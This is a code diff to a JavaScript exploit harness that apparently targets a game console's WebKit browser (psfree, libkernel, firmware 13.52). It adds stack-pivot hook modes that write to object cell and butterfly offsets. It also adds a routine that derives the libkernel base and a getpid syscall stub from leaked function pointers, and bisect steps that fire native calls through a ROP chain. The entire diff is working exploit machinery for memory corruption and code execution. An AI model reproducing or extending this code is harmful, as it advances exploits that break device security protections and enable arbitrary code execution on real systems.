@@ -75,7 +75,8 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke,
     firePivotGetpid,
     layoutSmokeStack, layoutGetpidStack, bisectArmG0, bisectHookPivot, bisectHookPivotPoops,
-    bisectFireExpm1, bisectFirePoopsStyle, bisectPreflight, G0_HOOK_OFFS, G0_HOOK_POOPS,
+    bisectFireExpm1, bisectFirePoopsStyle, bisectPreflight, G0_HOOK_OFFS, G0_HOOK_SAFE, G0_HOOK_POOPS,
+    bisectHookPivotMultiAll,
     bisectHookPivotButterfly, verifyPivotHookSaved,
     bisectRestore, bisectDisarmG0, bisectEmergencyUntangle, bisectRestorePivotOnly,
     fireNativeCallBisect, verifyFullChainSet, verifyBisectChainSet, describeSlabLayout,
@@ -83,15 +84,18 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     verifyPivotHookWrites,
     verifySlabContent, resolveBufAddrOff, verifyStackContent,
     readPivotButterfly, ensurePivotButterfly, formatPivotBfDiag,
+    applyPivotHookForFire,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830bg";
+const BUILD_ID = "rw-20250830bi";
 
 const NATIVE_BISECT_STEPS = [
-    { id: "smoke-now", label: "N0 getpid", title: "getpid @ lk (chain_poops) — needs lk in box" },
-    { id: "smoke-g30", label: "N0g+30", title: "getpid hook cell+0x30 (rsi=cell?)" },
+    { id: "smoke-now", label: "N0 getpid", title: "getpid — hook cell+0x30 default (13.52; ?hook=cell for poops +0)" },
+    { id: "smoke-g30", label: "N0g+30", title: "getpid hook cell+0x30 (same as N0 default)" },
+    { id: "smoke-gmulti", label: "N0m safe", title: "getpid multi-hook cell +20/+28/+30/+38 (no cell+0 header kill)" },
+    { id: "smoke-gall", label: "N0all", title: "getpid safe multi cell+butterfly (13.52 rsi hunt, one fire)" },
     { id: "smoke-gbf", label: "N0g bf0", title: "getpid hook butterfly+0 (auto-upgrades empty {} → props/ta)" },
     { id: "smoke-gbf30", label: "N0g bf30", title: "getpid hook butterfly+0x30 (auto-upgrades pivot if needed)" },
     { id: "prep", label: "N1 prep", title: "skip if PREP-PIN @ Start (?freshprep=1 to redo)" },
@@ -261,7 +265,7 @@ let raceMode = false;
 const raceBuf = [];
 
 let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn, nativeModeSel;
-let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnForceLk, btnAcceptFn, btnOneReadLk, btnGuessLk, btnTryBillZaiLk;
+let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnCalcFn, btnForceLk, btnAcceptFn, btnOneReadLk, btnGuessLk, btnTryBillZaiLk;
 let btnPsfreeLite, btnPsfreeLk, btnPsfreeStop, btnPeek, btnClear;
 let btnVerifyPivot, btnScanPivot, btnScanPivotFull;
 let gadgetBtns = [];
@@ -381,6 +385,10 @@ function setUi() {
     if (btnLoadCal) {
         btnLoadCal.disabled = busy || !ready;
         btnLoadCal.textContent = "2e Leak+lk";
+    }
+    if (btnCalcFn) {
+        btnCalcFn.disabled = busy;
+        btnCalcFn.textContent = "Calc fn";
     }
     if (btnOneReadLk) {
         btnOneReadLk.disabled = busy || !ready;
@@ -785,9 +793,16 @@ function trimBeforeNativeFire() {
 
 function pivotHookMode() {
     const q = params.get("hook");
-    if (q === "cell" || q === "bf" || q === "dual" || q === "cell30" || q === "bf30")
+    if (q === "cell" || q === "bf" || q === "dual" || q === "dual30"
+        || q === "cell30" || q === "bf30"
+        || q === "multi" || q === "multi-safe" || q === "multiall")
         return q;
-    return "cell";
+    return "cell30";
+}
+
+function pivotHookNeedsButterfly(mode) {
+    return mode === "bf" || mode === "bf30" || mode === "dual"
+        || mode === "dual30" || mode === "multiall";
 }
 
 function gateNativeFire(p, off) {
@@ -3050,6 +3065,96 @@ async function runShowLkHints() {
 let leakScanState = null;
 let calLkHits = [];
 let calLkHitIdx = 0;
+let calcFnExtIdx = 0;
+let calcFnHitIdx = 0;
+let calcFnLastHex = "";
+
+/** Calc fn from hex box or 2e ext ptrs — fn→lk→stub, 0 reads (then Accept fn). */
+function runCalcFn() {
+    if (busy) {
+        mark("LK-FN-SKIP", "busy — wait");
+        renderOut();
+        return;
+    }
+    const off = lkCalcOff();
+    let hex = addrIn && addrIn.value ? addrIn.value.trim().replace(/^0x/i, "") : "";
+    let pickLabel = null;
+
+    if (!hex) {
+        const cands = calExtPtrCandidates();
+        if (!cands.length) {
+            mark("LK-FN-SKIP", "paste k_usleep fn ptr — or run 2e Leak+lk first");
+            mark("LK-HINT", "2e fills LK-EXT-CAND → Calc fn cycles them (0 reads)");
+            state("paste fn or 2e first", "bad");
+            renderOut();
+            return;
+        }
+        const idx = calcFnExtIdx % cands.length;
+        const c = cands[idx];
+        pickLabel = c.label;
+        hex = String(c.ptr).replace(/^0x/i, "");
+        calcFnExtIdx = (calcFnExtIdx + 1) % cands.length;
+        mark("LK-FN-PICK", (idx + 1) + "/" + cands.length
+            + " " + c.label + " " + hex);
+    }
+
+    const ptr = parseAddr(hex);
+    if (!ptr) {
+        mark("LK-FN-SKIP", "bad hex");
+        state("bad hex", "bad");
+        renderOut();
+        return;
+    }
+
+    const asBase = verifyLibkernelZeroRead(ptr, off, { via: "calc-fn-base" });
+    if (asBase.ok) {
+        mark("LK-FN-SKIP", hex + " is 16KB lk base — paste k_usleep fn ptr");
+        mark("LK-HINT", "Calc fn wants fn ptr; use Accept lk for base");
+        state("need fn ptr not lk base", "warn");
+        renderOut();
+        return;
+    }
+
+    const hits = calcLkFromFnPtrZeroRead(ptr, off);
+    if (!hits.length) {
+        mark("LK-FN-CAL-MISS", hex + " — no Suchi RVA match");
+        mark("LK-HINT", "want k_usleep from 2e LK-EXT-CAND / LK-PTR-OK");
+        state("calc fn miss", "bad");
+        renderOut();
+        return;
+    }
+
+    if (hex !== calcFnLastHex) {
+        calcFnHitIdx = 0;
+        calcFnLastHex = hex;
+    }
+    const h = hits[calcFnHitIdx % hits.length];
+    calcFnHitIdx++;
+    const stubAddr = getpidStubFromFn(ptr, off);
+    const delta = (off.k_usleep != null && off.k_stubs && off.k_stubs[20] != null)
+        ? ((off.k_stubs[20] - off.k_usleep) >>> 0) : null;
+
+    if (addrIn) addrIn.value = hex;
+    mark("LK-FN-CAL", "build=" + BUILD_ID
+        + (pickLabel ? " " + pickLabel : "")
+        + " fn=" + hex + " → lk=" + h.lk + " (" + h.via + " −0x" + h.rva.toString(16) + ")"
+        + (stubAddr ? " stub=" + stubAddr
+            + (delta != null ? " (+0x" + delta.toString(16) + ")" : "") : "")
+        + " [" + calcFnHitIdx + "/" + hits.length + " alt]");
+    for (let i = 0; i < hits.length && i < 4; i++) {
+        const alt = hits[i];
+        if (String(alt.lk) === String(h.lk) && alt.via === h.via) continue;
+        mark("LK-FN-ALT", "lk=" + alt.lk + " via " + alt.via + " −0x" + alt.rva.toString(16));
+    }
+    mark("LK-HINT", "Accept fn (0 reads) — Calc fn again cycles alts / next 2e ptr");
+    state("fn calc OK — Accept fn", "ok");
+    renderOut();
+    try {
+        crashLog.append("CAL-FN " + hex + " lk=" + h.lk
+            + (stubAddr ? " stub=" + stubAddr : ""), "LK-FN-CAL");
+        crashLog.flushSync();
+    } catch (_) { }
+}
 
 /** Calc lk from hex box — lk base or fn ptr − Suchi RVA. No cal session needed. */
 function calcLkFromHex() {
@@ -4529,7 +4634,13 @@ function bisectPreFireLog(p, prep, lk, stub, tag, hookMode) {
     if (prep._pivotBfSource) bfStr += " src=" + prep._pivotBfSource;
     if (prep._pivotBfUpgraded) bfStr += " pivot=" + prep._pivotBfUpgraded;
     if (prep._pivotBfInjected) bfStr += " injected=1";
-    bisectLog("PRE-FIRE", tag + " lk=" + lk + " " + stubOk + " hook=" + hookMode
+    let hookSites = hookMode;
+    if (prep._bisect && prep._bisect.multiSaved && prep._bisect.multiSaved.length) {
+        hookSites = prep._bisect.multiSaved.map(function (e) {
+            return (e.base || "cell") + "+0x" + e.off.toString(16);
+        }).join(",");
+    }
+    bisectLog("PRE-FIRE", tag + " lk=" + lk + " " + stubOk + " hook=" + hookSites
         + " pivot=" + (params.get("pivot") || "empty")
         + " cell=" + prep.pivotCell + " bf=" + bfStr + " S=" + prep.M.S
         + " path=" + (prep._cap && prep._cap.path || "?"));
@@ -4541,11 +4652,13 @@ function bisectFireGetpidHook(p, off, hookMode, tag) {
     const stub = resolveGetpidStubOff(p, lk, off);
     if (!stub.verified || !stub.addr)
         throw new Error("getpid stub — Accept fn (k_usleep) first");
-    if (hookMode === "bf" || hookMode === "bf30" || hookMode === "dual")
+    if (pivotHookNeedsButterfly(hookMode))
         ensurePivotButterfly(p, nativePrep, window._wkCarrier || null);
+    const fireOpts = nativeFireOpts(hookMode, stub);
+    applyPivotHookForFire(p, nativePrep, off, fireOpts);
     bisectPreFireLog(p, nativePrep, lk, stub, tag, hookMode);
     bisectFlushBeforeFire();
-    return firePivotGetpid(p, nativePrep, lk, off, stub.off, nativeFireOpts(hookMode, stub));
+    return firePivotGetpid(p, nativePrep, lk, off, stub.off, fireOpts);
 }
 
 function codeLooksNative(code4) {
@@ -4696,6 +4809,20 @@ function runNativeBisectStep(stepId) {
             pid = bisectFireGetpidHook(p, off, "cell30", "N0g+30");
             bisectLog("BISECT-OK", "N0g+30 survived pid=" + pid);
             state("N0g+30 pid=" + pid, pid > 0 ? "ok" : "warn");
+            break;
+        case "smoke-gmulti":
+            requireNativePrep();
+            if (!gateNativeFire(p, off)) throw new Error("Verify first");
+            pid = bisectFireGetpidHook(p, off, "multi-safe", "N0m");
+            bisectLog("BISECT-OK", "N0m safe-multi survived pid=" + pid);
+            state("N0m pid=" + pid, pid > 0 ? "ok" : "warn");
+            break;
+        case "smoke-gall":
+            requireNativePrep();
+            if (!gateNativeFire(p, off)) throw new Error("Verify first");
+            pid = bisectFireGetpidHook(p, off, "multiall", "N0all");
+            bisectLog("BISECT-OK", "N0all cell+bf survived pid=" + pid);
+            state("N0all pid=" + pid, pid > 0 ? "ok" : "warn");
             break;
         case "smoke-gbf":
             requireNativePrep();
@@ -5360,6 +5487,7 @@ function init() {
     btnRwProof = $("btn-rw-proof");
     btnNative = $("btn-native");
     btnLoadCal = $("btn-load-cal");
+    btnCalcFn = $("btn-calc-fn");
     btnForceLk = $("btn-force-lk");
     btnAcceptFn = $("btn-accept-fn");
     btnOneReadLk = $("btn-one-read-lk");
@@ -5391,6 +5519,7 @@ function init() {
     wireClick(btnScanPivotFull, function () { return runPivotFullScanAuto(); });
     wireClick(btnNative, function () { return runNativeCall(); });
     wireClick(btnLoadCal, function () { runTryCalPtrs(); });
+    wireClick(btnCalcFn, function () { runCalcFn(); });
     wireClick(btnOneReadLk, runOneReadLk);
     wireClick(btnForceLk, function () { acceptLkFromHex(null); });
     wireClick(btnAcceptFn, function () { acceptFnFromHex(null); });
